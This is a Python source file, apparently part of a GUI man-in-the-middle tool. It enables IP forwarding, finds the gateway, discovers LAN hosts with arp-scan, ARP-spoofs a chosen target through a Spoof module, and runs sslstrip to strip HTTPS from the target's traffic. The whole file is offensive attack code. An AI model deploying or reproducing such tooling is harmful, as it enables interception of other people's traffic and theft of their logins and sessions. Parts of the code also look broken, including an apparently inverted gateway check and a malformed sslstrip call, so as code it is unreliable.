import socket, struct
import subprocess
import re
import threading
from WebRenderer import WebRenderer
import gi.repository
import Spoof
import Net_Controller

gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GObject

ipValidator = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
interface_finder = "ifconfig | sed 's/[ \t].*//;/^\(lo\|\)$/d'"


def def_gateway():
    network_info = "/proc/net/route"
    open("/proc/sys/net/ipv4/ip_forward", "w").write("1")
    with open(network_info) as file:
        for line in file:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                ip = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))).split(".")
                return ip

def getHosts():
    arpScanResult = subprocess.check_output("arp-scan -I " + Net_Controller.selectedInterface + " -l", shell=True)
    hosts = re.findall(ipValidator, str(arpScanResult))
    return hosts


def spoof(ui, target):

    ui.statusBar.config(text="Running Spoof on target " + target + "... ")
    Net_Controller.isSpoofRunning = True

    ui.txtOut.insert(open("sslstrip.log", 'r').read())
    Spoof.spoof()
    subprocess.call(['sslstrip -l 8080'])
    ui.txtOut.insert(open("sslstrip.log", 'r').read())